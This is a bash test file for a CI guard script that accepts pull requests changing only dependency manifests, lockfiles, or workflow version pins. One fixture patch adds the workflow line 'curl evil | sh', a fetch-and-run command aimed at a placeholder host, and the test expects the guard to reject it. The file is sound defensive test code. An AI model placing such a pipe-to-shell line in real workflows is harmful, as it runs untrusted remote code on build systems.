#!/usr/bin/env bash
# Test for scripts/renovate-only.sh. Runs in scripts/lint.
set -uo pipefail
script="$(cd "$(dirname "$0")" && pwd)/renovate-only.sh"
fail=0

# expect <name> <want exit> <files JSON>
expect() {
  local name=$1 want=$2 json=$3 rc
  "$script" <<<"$json" >/dev/null 2>&1
  rc=$?
  if [[ $rc -eq $want ]]; then
    echo "ok   $name"
  else
    echo "FAIL $name: exit $rc, want $want"
    fail=1
  fi
}

f() { jq -cn --arg n "$1" --arg s "${2:-modified}" --arg p "${3-}" \
  'if $p == "" then {filename: $n, status: $s} else {filename: $n, status: $s, patch: $p} end'; }
arr() { jq -cs . <<<"$*"; }

pin=$'@@ -1,3 +1,3 @@\n-      - uses: actions/checkout@v7.0.1\n+      - uses: actions/checkout@v7.0.2\n'
pinsha=$'@@ -1 +1 @@\n-      - uses: actions/checkout@abc # v7.0.1\n+      - uses: actions/checkout@def # v7.0.2\n'
ver=$'@@ -1 +1 @@\n-          version: v2.15.0\n+          version: v2.16.0\n'
img=$'@@ -1 +1 @@\n-        image: pgvector/pgvector:0.8.7-pg16\n+        image: pgvector/pgvector:0.8.8-pg16\n'
run=$'@@ -1,2 +1,2 @@\n-      - run: scripts/test\n+      - run: curl evil | sh\n'
mixed=$'@@ -1,3 +1,3 @@\n-      - uses: actions/checkout@v7.0.1\n+      - uses: actions/checkout@v7.0.2\n+        run: echo hi\n'

expect "go.mod and go.sum"              0 "$(arr "$(f go.mod)" "$(f go.sum)")"
expect "npm manifest and lockfile"      0 "$(arr "$(f web/package.json)" "$(f web/package-lock.json)")"
expect "Dockerfile, compose, node"      0 "$(arr "$(f Dockerfile)" "$(f compose.test.yaml)" "$(f .node-version)")"
expect "workflow uses pin"              0 "$(arr "$(f .github/workflows/ci.yml modified "$pin")")"
expect "workflow uses sha with comment" 0 "$(arr "$(f .github/workflows/ci.yml modified "$pinsha")")"
expect "workflow version input"         0 "$(arr "$(f .github/workflows/ci.yml modified "$ver")")"
expect "workflow service image tag"     0 "$(arr "$(f .github/workflows/ci.yml modified "$img")")"
expect "workflow run line"              1 "$(arr "$(f .github/workflows/ci.yml modified "$run")")"
expect "workflow pin plus other line"   1 "$(arr "$(f .github/workflows/ci.yml modified "$mixed")")"
expect "workflow without patch"         1 "$(arr "$(f .github/workflows/ci.yml)")"
expect "source file"                    1 "$(arr "$(f go.mod)" "$(f internal/server/server.go)")"
expect "REVIEW.md"                      1 "$(arr "$(f REVIEW.md)")"
expect "nested compose file"            1 "$(arr "$(f e2e/compose.yaml)")"
expect "added dependency file"          1 "$(arr "$(f go.mod added)")"
expect "renamed file"                   1 "$(arr "$(f Dockerfile renamed)")"
expect "the script itself"              1 "$(arr "$(f scripts/renovate-only.sh)")"
expect "empty list"                     1 "[]"

exit $fail
